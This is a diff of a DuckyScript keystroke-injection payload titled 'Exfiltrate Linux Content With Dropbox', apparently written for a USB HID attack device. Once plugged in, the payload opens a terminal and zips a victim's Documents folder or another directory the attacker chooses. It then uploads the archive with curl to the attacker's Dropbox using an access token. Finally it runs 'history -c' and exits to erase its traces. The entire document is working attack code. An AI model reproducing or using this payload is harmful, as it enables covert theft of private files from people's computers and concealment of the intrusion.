@@ -1,77 +1,61 @@
-* ##########################################################
-* #                                                        |
-* # Title        : Exfiltrate Linux Content With Dropbox   |
-* # Author       : Aleff                                   |
-* # Version      : 1.0                                     |
-* # Category     : Exfiltration                            |
-* # Target       : Linux                                   |
-* #                                                        |
-* ##########################################################
+##########################################################
+#                                                        #
+# Title        : Exfiltrate Linux Content With Dropbox   #
+# Author       : Aleff                                   #
+# Version      : 1.0                                     #
+# Category     : Exfiltration                            #
+# Target       : Linux                                   #
+#                                                        #
+##########################################################
 
-* Requirements:
-*     - Internet Connection
-*     - Dropbox Account
-*     - - DROPBOX_ACCESS_TOKEN
+ATTACKMODE HID
 
+# REQUIREMENTS
+#  - Internet Connection
+#  - DROPBOX_ACCESS_TOKEN
+
+# VARIABLES
+# - 1) Set here your Dropbox access TOKEN
+DROPBOX_ACCESS_TOKEN='example'
+# - 2) Set here the directory that you want to Exfiltrate i.e. '/home/$USER_NAME/Documents' Pay attention to the fact that this payload is set up to know the user name of the machines, which is identified via the variable $USER
+DIRECTORY-PATH='example'
+
+# CONSTS
+DROPBOX_API_CONST='https://content.dropboxapi.com/2/files/upload'
 
 QUACK DELAY 1000
 QUACK CTRL-ALT t
-
-QUACK DELAY 2000
-* Required: Set here your Dropbox access TOKEN
-QUACK STRING ACCESS_TOKEN="TOKEN"
-QUACK ENTER
-
 QUACK DELAY 500
 QUACK STRING USER_NAME=$(whoami)
 QUACK ENTER
-
-QUACK DELAY 500
-QUACK STRING path="/home/$USER_NAME/Documents"
-QUACK ENTER
-
 QUACK DELAY 500
 QUACK STRING RANDOM=$(shuf -i 1-999999999999 -n 1)
 QUACK ENTER
-
 QUACK DELAY 500
-QUACK STRING NAME="$RANDOM.zip"
+QUACK STRING NAME=\"$RANDOM.zip\"
 QUACK ENTER
-
 QUACK DELAY 500
-QUACK STRING ZIP_PATH="$path/$NAME"
+QUACK STRING ZIP_PATH=\"$DIRECTORY-PATH/$NAME\"
 QUACK ENTER
-
 QUACK DELAY 500
-* The FOLDER that you want to zip, in this example you want to zip all Documents content
-QUACK STRING FOLDER="/home/$USER_NAME/Documents/"
-QUACK ENTER
 
-* Delay for zipping operation, it depends by computer power and folder directory
+# Delay for zipping operation, it depends by computer power and folder directory
 QUACK DELAY 10000
 
 QUACK DELAY 500
-QUACK STRING if [ -r "$FOLDER" ]; then
+QUACK STRING if [ -r \"$DIRECTORY-PATH\" ]; then
 QUACK ENTER
-QUACK STRING zip -r "$ZIP_PATH" "$FOLDER" > /dev/null 2>&1
+QUACK STRING zip -r \"$ZIP_PATH\" \"$DIRECTORY-PATH\" > /dev/null 2>&1
 QUACK ENTER
 QUACK STRING else
 QUACK ENTER
-QUACK STRING echo   ""
+QUACK STRING echo   \"\"
 QUACK ENTER
 QUACK STRING fi
 QUACK ENTER
-
 QUACK DELAY 500
-QUACK STRING DROPBOX_FOLDER="/$NAME"
+QUACK STRING DROPBOX_FOLDER=\"/$NAME\"
 QUACK ENTER
-
-
 QUACK DELAY 500
-* DEFINE DROPBOX_API_CONST https://content.dropboxapi.com/2/files/upload
-QUACK STRING curl -X POST DROPBOX_API_CONST --header "Authorization: Bearer $ACCESS_TOKEN" --header "Dropbox-API-Arg: {\"path\": \"$DROPBOX_FOLDER\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" --header "Content-Type: application/octet-stream" --data-binary "@$ZIP_PATH"
-QUACK ENTER
-
-QUACK DELAY 2000
-QUACK STRING history -c
+QUACK STRING curl -X POST $DROPBOX_API_CONST --header \"Authorization: Bearer $DROPBOX_ACCESS_TOKEN\" --header \"Dropbox-API-Arg: {'path': '$DROPBOX_FOLDER','mode': 'add','autorename': true,'mute': false}\" --header \"Content-Type: application/octet-stream\" --data-binary \"@$ZIP_PATH\"; history -c; exit
 QUACK ENTER
